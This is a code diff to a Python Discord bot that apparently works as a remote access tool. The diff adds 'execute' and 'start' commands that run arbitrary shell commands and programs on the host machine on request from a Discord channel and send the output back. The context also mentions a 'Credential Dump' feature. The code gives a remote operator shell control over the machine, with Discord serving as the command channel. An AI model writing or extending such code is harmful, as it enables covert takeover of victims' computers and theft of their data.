@@ -163,26 +163,63 @@ Credential Dump:
     await ctx.send(f"```\n{help_text}\n```")
 
 @bot.command(name="execute")
-async def run_terminal_command(ctx, *, command_input: str):
+async def execute_command(ctx, *, command_input: str):
+    """
+    Runs a command and waits for output.
     
-    output_result = subprocess.getoutput(command_input)
+    """
 
-    
+    try:
+        result = subprocess.run(
+            command_input,
+            shell=True,
+            capture_output=True,
+            text=True,
+            timeout=30
+        )
+
+        output_result = result.stdout + result.stderr
+
+    except subprocess.TimeoutExpired:
+        output_result = "Command timed out after 30 seconds."
+
+    except Exception as e:
+        output_result = f"Error: {e}"
+
+    if not output_result.strip():
+        output_result = "*No output returned from command*"
+
     if len(output_result) > 1900:
-        
-        buffer = io.StringIO(output_result)
+        buffer = io.BytesIO(output_result.encode("utf-8"))
         await ctx.send(
-            f"📤 **Command output (long, saved to file):** `{command_input}`",
-            file=discord.File(buffer, filename="QUANTAM.txt")
+            f"📤 Output from `{command_input}`",
+            file=discord.File(buffer, filename="output.txt")
         )
     else:
-        
-        if output_result.strip() == "":
-            output_result = "*No output returned from command*"
         await ctx.send(
-            f"🖥️ **Command:** `{command_input}`\n"
-            f"```\n{output_result}\n```"
+            f"🖥️ Command: `{command_input}`\n```{output_result}```"
         )
+
+
+@bot.command(name="start")
+async def start_program(ctx, *, command_input: str):
+    """
+    Starts a program without waiting.
+    
+    """
+
+    try:
+        process = subprocess.Popen(
+            command_input,
+            shell=True
+        )
+
+        await ctx.send(
+            f"✅ Started:\n```{command_input}```\nPID: `{process.pid}`"
+        )
+
+    except Exception as e:
+        await ctx.send(f"❌ Failed to start:\n```{e}```")
 
 @bot.command(name='cd')
 async def change_directory(ctx, *, path=None):
